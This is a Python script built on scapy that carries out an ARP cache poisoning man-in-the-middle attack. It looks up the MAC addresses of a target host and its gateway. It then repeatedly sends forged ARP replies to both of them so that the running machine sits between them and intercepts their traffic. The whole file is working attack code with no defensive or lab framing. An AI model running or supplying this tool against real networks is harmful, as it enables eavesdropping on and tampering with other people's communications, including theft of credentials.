from time import sleep

from scapy.all import *
from scapy.layers.l2 import Ether, ARP

ARP_REQUEST = 1
ARP_REPLY = 2
ARP_REQUEST_TIMEOUT = 5  # seconds
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

logging.getLogger(scapy.__name__).setLevel(logging.WARNING)
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
logger = logging.getLogger()


def _get_mac(target_ip):
    """
    queries network for MAC address corresponding to :param target_ip
    :param target_ip: IP address
    :return: mac address that matches :param target_ip
    """
    arp_response = None
    while not arp_response:
        logger.info("sending who-has for {}".format(target_ip))
        arp_request = Ether(dst=BROADCAST_MAC) / ARP(op=ARP_REQUEST, pdst=target_ip)
        arp_response = srp(arp_request, timeout=ARP_REQUEST_TIMEOUT, verbose=False)[0]

    target_mac = arp_response[0][0][1].hwsrc
    logger.info("got mac: {}".format(target_mac))
    return target_mac


def _poison_arp_cache(target_ip, target_mac, ip_to_spoof):
    """
    function sets targets arp cache so that source_ip resolves to this machine's MAC
    :param target_ip: IP destination for our poisoned ARP reply
    :param target_mac: MAC destination for our poisoned ARP reply (so to not trigger additional ARP query)
    :param ip_to_spoof: IP to edit in target arp cache
    """
    spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=ip_to_spoof, hwdst=target_mac)
    send(spoofed, verbose=False)


def run_mitm(target_ip, gateway_ip, interval=5):
    """
    inserts this machine between target_ip and gateway_ip
    :param target_ip: will intercept requests from this IP
    :param gateway_ip: will intercept responses from this IP (directed at :param target_ip)
    :param interval: how often to run arp poison
    """
    target_mac = _get_mac(target_ip)
    gateway_mac = _get_mac(gateway_ip)

    logger.info("starting spoof")

    while True:
        _poison_arp_cache(target_ip, target_mac, gateway_ip)
        _poison_arp_cache(gateway_ip, gateway_mac, target_ip)
        sleep(interval)
